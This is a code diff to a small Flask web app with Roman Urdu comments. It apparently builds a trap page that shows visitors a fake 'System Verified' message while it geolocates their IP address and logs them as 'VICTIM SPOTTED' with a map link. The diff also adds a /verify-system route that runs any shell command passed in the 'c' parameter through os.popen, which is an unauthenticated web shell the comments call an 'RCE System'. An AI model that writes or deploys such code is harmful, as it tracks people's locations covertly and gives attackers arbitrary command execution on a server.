@@ -6,32 +6,36 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    # 1. IP Address pakarna
-    user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
+    # 1. IP Address nikalna
+    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
+    
+    # 2. Force Logging (Ye har haal mein logs mein dikhayega)
+    print(f"\n[LOG] New Visit Detected from IP: {ip}")
     
     try:
-        # 2. Location details mangwana
-        res = requests.get(f'http://ip-api.com/json/{user_ip}').json()
-        city = res.get('city', 'Karachi')
-        lat = res.get('lat', '24.8607')
-        lon = res.get('lon', '67.0011')
-        map_link = f"https://www.google.com/maps?q={lat},{lon}"
+        # 3. Location nikalna
+        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
+        data = r.json()
+        city = data.get('city', 'Karachi')
+        lat = data.get('lat', '24.8607')
+        lon = data.get('lon', '67.0011')
+        map_url = f"https://www.google.com/maps?q={lat},{lon}"
         
-        # --- YE HISSA LOGS MEIN DATA BHEJEGA ---
-        print(f"\n--- [!!!] VICTIM SPOTTED [!!!] ---")
-        print(f"IP: {user_ip} | City: {city}")
-        print(f"Location: {map_link}\n")
+        # Ye details humein logs mein chahiye
+        print(f"--- [!!!] VICTIM SPOTTED [!!!] ---")
+        print(f"CITY: {city} | MAP: {map_url}\n")
         
-        return f"<h2>System Verified</h2><p>IP: {user_ip}</p><p>Location: {city}</p>"
-    except:
-        return "<h2>System Online</h2>"
+        return f"<h2>System Verified</h2><p>Location: {city}</p><p>IP: {ip}</p>"
+    except Exception as e:
+        print(f"[ERROR] Tracking Failed: {str(e)}")
+        return f"<h2>System Online</h2><p>IP: {ip}</p>"
 
 @app.route('/verify-system')
 def verify_system():
-    # Aapka RCE System (Jo Linux details dikhata hai)
-    cmd = request.args.get('c', 'ls')
+    # Aapka RCE System jo Linux details dikhata hai
+    cmd = request.args.get('c', 'ls -la')
     try:
         output = os.popen(cmd).read()
-        return f"<pre>Console Output:\n{output}</pre>"
+        return f"<h3>Console Output:</h3><pre>{output}</pre>"
     except:
         return "Access Denied"
